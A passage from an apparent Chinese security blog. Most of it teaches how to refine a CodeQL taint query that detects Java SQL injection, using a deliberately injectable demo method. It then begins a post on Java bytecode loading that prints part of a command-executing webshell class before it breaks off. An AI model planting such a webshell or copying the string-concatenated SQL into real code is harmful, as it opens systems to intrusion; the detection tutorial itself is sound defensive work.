class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSanitizer</span><span class="params">(DataFlow::Node node)</span> &#123;</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> PrimitiveType or</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> BoxedType or</span><br><span class="line">    node.getType() <span class="keyword">instanceof</span> NumberType or</span><br><span class="line">    <span class="title function_">exists</span><span class="params">(ParameterizedType pt| node.getType()</span> = pt and pt.getTypeArgument(<span class="number">0</span>) <span class="keyword">instanceof</span> NumberType )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思是：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。</p><p>重新执行query，发现误报已经消除。</p><h2 id="修改2"><a href="#修改2" class="headerlink" title="修改2"></a>修改2</h2><p>我们发现，如下的sql没有被codeql捕捉到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过<code>isAdditionalTaintStep</code>方法。</p><p>实现原理就是：&#x3D;&#x3D;断了就给他接上&#x3D;&#x3D;</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207163443.png"></p><p>isAddtionalTaintStep方法是Codeql的类TainTracking::Configuration提供的方法，他的原型是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isAdditionalTaintStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>他的作用是<code>将一个可控节点A强制传递给另外一个节点B，那么节点B也就成了可控节点</code></p><p>多次测试以后，发现是<code>username.get()</code>断掉了，大概是因为<code>Optional</code>这种类型的使用没有在Codeql语法库里</p><p>那么，我们让username强制流转到<code>username.get()</code>，这样username.get()就变得可控了，这样就能识别出这个注入漏洞了。</p><p>修改codeql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/examples/vuldemo</span></span><br><span class="line"><span class="comment"> * @name Sql-Injection</span></span><br><span class="line"><span class="comment"> * @description Sql-Injection</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span>, MethodAccess call1 <span class="operator">|</span> expSrc <span class="operator">=</span> call1.getArgument(<span class="number">0</span>) <span class="keyword">and</span> expDest<span class="operator">=</span><span class="keyword">call</span> <span class="keyword">and</span> call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span> method.hasName(&quot;get&quot;) <span class="keyword">and</span> method.getDeclaringType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot; <span class="keyword">and</span> call1.getArgument(<span class="number">0</span>).getType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof NumberType <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">exists</span>(ParameterizedType pt<span class="operator">|</span> node.getType() <span class="operator">=</span> pt <span class="keyword">and</span> pt.getTypeArgument(<span class="number">0</span>) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>上述，我们实现了一个<code>isTaintedString</code>谓词，并使用exists子查询方式实现了强制把<code>Optional&lt;String&gt; username</code>关联<code>    Optional&lt;String&gt; username.get()</code></p><p>最后，注入就可以被跑出来了</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207164341.png"></p><p>我们就简单粗暴的把数据流连通了。</p><h2 id="Lombok问题"><a href="#Lombok问题" class="headerlink" title="Lombok问题"></a>Lombok问题</h2><p>lombok是非常有名的java类，通过注解省略了很多不必要的臃肿代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.data;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这样的话，由注解生成的代码，导致codeql无法获取到lombok自动生成的代码，所以就导致使用了lombok的代码即使存在漏洞，也无法被识别的问题</p><p>再codeql里的issue里面，有人给出了这个问题的解决办法,如下</p><p><a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">https://github.com/github/codeql/issues/4984#:~:text&#x3D;Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># get a copy of lombok.jar</span><br><span class="line">wget https:<span class="comment">//projectlombok.org/downloads/lombok.jar -O &quot;lombok.jar&quot;</span></span><br><span class="line"># run <span class="string">&quot;delombok&quot;</span> on the source files and write the generated files to a folder named <span class="string">&quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"># remove <span class="string">&quot;generated by&quot;</span> comments</span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -exec sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"># remove any left-over <span class="keyword">import</span> statements</span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -exec sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"># copy delombok<span class="string">&#x27;d files over the original ones</span></span><br><span class="line"><span class="string">cp -r &quot;delombok/.&quot; &quot;./&quot;</span></span><br><span class="line"><span class="string"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="string">rm -rf &quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>上面实现的功能是，去掉代码里lombok注解，并且还原<code>getter</code>和<code>setter</code>方法的java代码，从而使得codeql的flow流能够顺利流下去。从而检索到相应的漏洞</p><p>(根据对应的操作系统自动转化相应的方法)</p><h2 id="最终优化"><a href="#最终优化" class="headerlink" title="最终优化"></a>最终优化</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> <span class="variable">@id</span> java<span class="operator">/</span>examples<span class="operator">/</span>vuldemo</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@name</span> <span class="keyword">Sql</span><span class="operator">-</span>Injection</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@description</span> <span class="keyword">Sql</span><span class="operator">-</span>Injection</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@kind</span> path<span class="operator">-</span>problem</span><br><span class="line"> <span class="operator">*</span> <span class="variable">@problem</span>.severity warning</span><br><span class="line"> <span class="operator">*</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span>, MethodAccess call1 <span class="operator">|</span> expSrc <span class="operator">=</span> call1.getArgument(<span class="number">0</span>) <span class="keyword">and</span> expDest<span class="operator">=</span><span class="keyword">call</span> <span class="keyword">and</span> call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span> method.hasName(&quot;get&quot;) <span class="keyword">and</span> method.getDeclaringType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot; <span class="keyword">and</span> call1.getArgument(<span class="number">0</span>).getType().toString() <span class="operator">=</span> &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line">    node.getType() instanceof NumberType <span class="keyword">or</span></span><br><span class="line">    <span class="keyword">exists</span>(ParameterizedType pt<span class="operator">|</span> node.getType() <span class="operator">=</span> pt <span class="keyword">and</span> pt.getTypeArgument(<span class="number">0</span>) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h2 id="codeql进阶"><a href="#codeql进阶" class="headerlink" title="codeql进阶"></a>codeql进阶</h2><p>我们再上面的案例中看到了<code>instanceof</code>，如果我们去看codeql自带的规则库，会发现大量的<code>instanceof</code>语句</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207190246.png"></p><p>我们已经知道，可以使用exists(|)这种方式来定义source 和sink，但是如果，source&#x2F;sink特别复杂（比如，我们为了规则通用，可能要适配Springboot，Thrift RPC，Servlet等source），如果我们把这些都在一个子查询内完成，比如，condition 1 or condition 2 or condition3 ，这样就比较难维护，比较冗杂</p><p>instanceof给我们提供了一种机制，我们只需要定义一个abstract class，比如这个案例当中的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** A data flow source of remote user input. */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteFlowSource</span> <span class="keyword">extends</span> <span class="title class_">DataFlow</span>::Node &#123;</span><br><span class="line">  <span class="comment">/** Gets a string that describes the type of this remote flow source. */</span></span><br><span class="line">  <span class="keyword">abstract</span> string <span class="title function_">getSourceType</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再isSource方法里进行instanceof，判断src是RemoteFlowSource就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123;</span><br><span class="line">    src <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话，java和codeql会有一些不一样。</p><p>我们继承了一个abstract抽象类，但是没有实现方法，怎么获得source？</p><p>codeql的特性：只要继承了RemoteFlowSource类，那么所有的子类就会被调用，他所代表的source也会被加载。我们在RemoteFlowSource下可以看到非常多的子类，他们的结果都会被用and串联加载</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207202215.png"></p><h2 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h2><p>递归调用可以帮我们解决一类问题：我们不确定需要调用多少次方法才能得到我们想要的结果的时候，我们就可以选择递归调用</p><p>CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。</p><p>我们来举一个例子：</p><p>在java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们需要根据innnerTwo类定位到最外层的StudentService类，怎么办？</p><p>按照非递归的写法，我们可以这样做</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> classes.getEnclosingType().getEnclosingType()   <span class="operator">/</span><span class="operator">/</span> getEnclosingtype获取作用域</span><br></pre></td></tr></table></figure><p>我们通过连续2次调用getEnclosingType方法是能够拿到最外层的StudentService的。</p><p>但正如我们开始所说，实际情况是我们并不清楚一开始有多少层外嵌，而且多个文件可能每个嵌套数量都不一样，我们没办法通过调用的次数来解决此问题，我们就需要用递归的方式去解决。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> classes.getEnclosingType<span class="operator">+</span>()   <span class="operator">/</span><span class="operator">/</span> 获取作用域</span><br></pre></td></tr></table></figure><p>也可以自己封装方法来调用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> demo<span class="operator">*</span>(classes)   <span class="operator">/</span><span class="operator">/</span> 获取作用域</span><br></pre></td></tr></table></figure><h2 id="强制类型转换问题"><a href="#强制类型转换问题" class="headerlink" title="强制类型转换问题"></a>强制类型转换问题</h2><p>在CodeQL的规则集里，我们会看到很多类型转换的代码，比如：</p><p>打印所有方法的参数名称和类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Parameter</span> param</span><br><span class="line"><span class="keyword">select</span> param, param.getType()</span><br></pre></td></tr></table></figure><p>换成如下语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Parameter</span> param</span><br><span class="line"><span class="keyword">select</span> param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>这样就强制转换成了RefType，意思就是从前面的结果中过滤出<code>RefType</code>的类型参数</p><blockquote><p>RefType是一种引用类型，就是去掉int等基本类型之后的数据</p></blockquote><blockquote><p>IntegralType  与上面相反的，必要类型</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207214743.png"></p><h3 id="其他师傅的文章例子"><a href="#其他师傅的文章例子" class="headerlink" title="其他师傅的文章例子"></a>其他师傅的文章例子</h3><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html</a></p><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</a></p>]]></content>
    
    
    <summary type="html">对codeql的一些学习</summary>
    
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/categories/codeql/"/>
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>java字节码加载的相关笔记</title>
    <link href="https://h0ld1rs.github.io/posts/42607.html"/>
    <id>https://h0ld1rs.github.io/posts/42607.html</id>
    <published>2022-03-11T12:34:06.000Z</published>
    <updated>2022-03-13T15:45:04.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java加载字节码的相关笔记"><a href="#java加载字节码的相关笔记" class="headerlink" title="java加载字节码的相关笔记"></a>java加载字节码的相关笔记</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在java安全很多情况下都需要加载字节码来实现，这个实现离不开类加载器，也就是<code>ClassLoader</code></p><p>在p神 《java安全漫谈13》中提到到动态加载字节码的方式，这里结合<code>4ra1n</code>师傅的文章做一个总结</p><h2 id="0x01-自定义类加载器"><a href="#0x01-自定义类加载器" class="headerlink" title="0x01 自定义类加载器"></a>0x01 自定义类加载器</h2><p>这里是用于加载<code>JSP Webshell</code>的讨论</p><p>首先有一个加载的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ByteCodeEvil</span> &#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ByteCodeEvil</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 简单回显 Webshell</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            